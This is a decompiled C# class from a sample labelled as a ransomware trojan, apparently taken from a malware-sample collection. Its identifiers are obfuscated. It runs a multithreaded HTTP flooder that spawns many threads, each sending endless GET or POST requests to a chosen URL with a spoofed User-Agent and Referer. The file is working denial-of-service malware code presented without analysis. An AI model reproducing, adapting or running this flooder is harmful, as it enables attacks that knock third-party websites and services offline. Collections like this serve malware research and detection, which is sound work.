// Decompiled with JetBrains decompiler
// Type: wXicurPkJBxJaoKxHfaDFlG
// Assembly: AutoCheckBlackmarket, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 75EFCFBA-7DC9-4B3B-BE71-9373569A5CFD
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.10-msil\HEUR-Trojan-Ransom.Win32.Generic-8865821e232bb31b1db7b1220c933ee51fd7508af48d79d1e7882dd1bf624f62.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Net;
using System.Threading;

public class wXicurPkJBxJaoKxHfaDFlG
{
  private static ThreadStart[] LTJoxxwCYfmRedtwzrQfYIq;
  private static Thread[] sNpuIFnBaaCKXySxWnOnysL;
  public static string uRBMSOZqFNOYvqUVCJbjZFz;
  public static string ByEpvDTutKzDtTvbZHvQGwL;
  public static string VEEqqSanPjOmEQFCvOLhRci;
  public static bool epHIdfoMsWmTZsBpVRRPUGy;
  public static int GkLwMQTLjNrbXMgWNblUUHt;
  public static bool VqESzRDHgVSMebyUsyuHKYt;
  private static wXicurPkJBxJaoKxHfaDFlG.gjbzPIrZcwZdrCXkXKlIGiQ[] vFPJmDVpJDsYhhgkWPWBNNd;
  public static int hTXwXicurPkJBxJaoKxHfaD;

  public static void FlGLTJoxxwCYfmRedtwzrQf()
  {
    wXicurPkJBxJaoKxHfaDFlG.sNpuIFnBaaCKXySxWnOnysL = new Thread[checked (wXicurPkJBxJaoKxHfaDFlG.hTXwXicurPkJBxJaoKxHfaD - 1 + 1)];
    wXicurPkJBxJaoKxHfaDFlG.LTJoxxwCYfmRedtwzrQfYIq = new ThreadStart[checked (wXicurPkJBxJaoKxHfaDFlG.hTXwXicurPkJBxJaoKxHfaD - 1 + 1)];
    wXicurPkJBxJaoKxHfaDFlG.vFPJmDVpJDsYhhgkWPWBNNd = new wXicurPkJBxJaoKxHfaDFlG.gjbzPIrZcwZdrCXkXKlIGiQ[checked (wXicurPkJBxJaoKxHfaDFlG.hTXwXicurPkJBxJaoKxHfaD - 1 + 1)];
    if (!wXicurPkJBxJaoKxHfaDFlG.uRBMSOZqFNOYvqUVCJbjZFz.StartsWith("http://"))
      wXicurPkJBxJaoKxHfaDFlG.uRBMSOZqFNOYvqUVCJbjZFz = "http://" + wXicurPkJBxJaoKxHfaDFlG.uRBMSOZqFNOYvqUVCJbjZFz;
    int num = checked (wXicurPkJBxJaoKxHfaDFlG.hTXwXicurPkJBxJaoKxHfaD - 1);
    int index = 0;
    while (index <= num)
    {
      wXicurPkJBxJaoKxHfaDFlG.vFPJmDVpJDsYhhgkWPWBNNd[index] = new wXicurPkJBxJaoKxHfaDFlG.gjbzPIrZcwZdrCXkXKlIGiQ(wXicurPkJBxJaoKxHfaDFlG.uRBMSOZqFNOYvqUVCJbjZFz, wXicurPkJBxJaoKxHfaDFlG.GkLwMQTLjNrbXMgWNblUUHt, wXicurPkJBxJaoKxHfaDFlG.ByEpvDTutKzDtTvbZHvQGwL, wXicurPkJBxJaoKxHfaDFlG.VEEqqSanPjOmEQFCvOLhRci);
      wXicurPkJBxJaoKxHfaDFlG.LTJoxxwCYfmRedtwzrQfYIq[index] = new ThreadStart(wXicurPkJBxJaoKxHfaDFlG.vFPJmDVpJDsYhhgkWPWBNNd[index].Send);
      wXicurPkJBxJaoKxHfaDFlG.sNpuIFnBaaCKXySxWnOnysL[index] = new Thread(wXicurPkJBxJaoKxHfaDFlG.LTJoxxwCYfmRedtwzrQfYIq[index]);
      wXicurPkJBxJaoKxHfaDFlG.sNpuIFnBaaCKXySxWnOnysL[index].Start();
      checked { ++index; }
    }
    wXicurPkJBxJaoKxHfaDFlG.VqESzRDHgVSMebyUsyuHKYt = true;
  }

  public static void SCjmHjnCxhuUUuEQsMrPhHh()
  {
    int num = checked (wXicurPkJBxJaoKxHfaDFlG.hTXwXicurPkJBxJaoKxHfaD - 1);
    int index = 0;
    while (index <= num)
    {
      try
      {
        wXicurPkJBxJaoKxHfaDFlG.sNpuIFnBaaCKXySxWnOnysL[index].Abort();
        wXicurPkJBxJaoKxHfaDFlG.sNpuIFnBaaCKXySxWnOnysL[index] = (Thread) null;
        wXicurPkJBxJaoKxHfaDFlG.LTJoxxwCYfmRedtwzrQfYIq[index] = (ThreadStart) null;
        wXicurPkJBxJaoKxHfaDFlG.vFPJmDVpJDsYhhgkWPWBNNd[index] = (wXicurPkJBxJaoKxHfaDFlG.gjbzPIrZcwZdrCXkXKlIGiQ) null;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      checked { ++index; }
    }
    wXicurPkJBxJaoKxHfaDFlG.VqESzRDHgVSMebyUsyuHKYt = false;
  }

  private class gjbzPIrZcwZdrCXkXKlIGiQ
  {
    private string smFoLuFLHTkyHIRojNPvCVd;
    private string TytusxipwNnnDtvnNpUSzoJ;
    private string zqEPxwkkMUgJcIfxKxvpIFb;
    private WebClient LWbYjBCXYhGmQfMSltjPKLJ;
    private int OyrzdFpGKMEdGkVRFZQHVfO;

    public gjbzPIrZcwZdrCXkXKlIGiQ(
      string NBnOkwLsKwBaOMGYVrOmsoz,
      int DSnoyIDgvPiCwlRabZePJQt,
      string HGWadUtJBlTVqTXlvQeREeB,
      string zcJbNRqRcWolIeDuqDTiErB)
    {
      this.LWbYjBCXYhGmQfMSltjPKLJ = new WebClient();
      this.smFoLuFLHTkyHIRojNPvCVd = NBnOkwLsKwBaOMGYVrOmsoz;
      this.OyrzdFpGKMEdGkVRFZQHVfO = DSnoyIDgvPiCwlRabZePJQt;
      this.TytusxipwNnnDtvnNpUSzoJ = HGWadUtJBlTVqTXlvQeREeB;
      this.zqEPxwkkMUgJcIfxKxvpIFb = zcJbNRqRcWolIeDuqDTiErB;
    }

    public void Send()
    {
      while (true)
      {
        try
        {
          if (!wXicurPkJBxJaoKxHfaDFlG.epHIdfoMsWmTZsBpVRRPUGy)
            this.LWbYjBCXYhGmQfMSltjPKLJ.Headers.Add("GET: " + this.smFoLuFLHTkyHIRojNPvCVd + " HTTP/1.1");
          else
            this.LWbYjBCXYhGmQfMSltjPKLJ.Headers.Add("POST: " + this.smFoLuFLHTkyHIRojNPvCVd + " HTTP/1.1");
          this.LWbYjBCXYhGmQfMSltjPKLJ.Headers.Add(HttpRequestHeader.UserAgent, this.TytusxipwNnnDtvnNpUSzoJ);
          this.LWbYjBCXYhGmQfMSltjPKLJ.Headers.Add(HttpRequestHeader.Referer, this.zqEPxwkkMUgJcIfxKxvpIFb);
          this.LWbYjBCXYhGmQfMSltjPKLJ.DownloadString(this.smFoLuFLHTkyHIRojNPvCVd);
          Thread.Sleep(this.OyrzdFpGKMEdGkVRFZQHVfO);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          Thread.Sleep(this.OyrzdFpGKMEdGkVRFZQHVfO);
          ProjectData.ClearProjectError();
        }
      }
    }
  }
}
